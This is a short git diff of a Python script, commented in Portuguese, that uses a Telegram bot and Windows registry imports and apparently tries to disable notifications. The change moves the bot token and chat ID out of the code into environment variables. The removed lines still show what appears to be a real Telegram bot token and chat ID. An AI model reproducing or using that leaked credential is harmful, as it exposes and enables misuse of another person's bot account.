@@ -6,11 +6,22 @@ import socket # Import para pegar o Hostname
 #Import para tentar desativar as notificacoes
 import winreg
 import ctypes
-import sys
+ 
+# --- CONFIGURAÇÃO ---
+import os  # <--- 1. Importar a biblioteca 'os'
+from dotenv import load_dotenv  # <--- 2. Importar a função 'load_dotenv'
 
 # --- CONFIGURAÇÃO ---
-TOKEN = "7980162914:AAFoK_YwqY4YqvUy7TSbX_7WCfXwcWkw-Qk"
-CHAT_ID = "-1002836339711"
+load_dotenv()  # <--- 3. Carrega as variáveis do arquivo .env
+
+# 4. Lê as variáveis do ambiente
+TOKEN = os.getenv("TELEGRAM_TOKEN")
+CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+
+# Verifica se as variáveis foram carregadas
+if not TOKEN or not CHAT_ID:
+    raise ValueError("As variáveis de ambiente TELEGRAM_TOKEN e TELEGRAM_CHAT_ID não foram definidas!")
+
 bot = telegram.Bot(token=TOKEN)
 
 # --- FUNÇÃO 1:
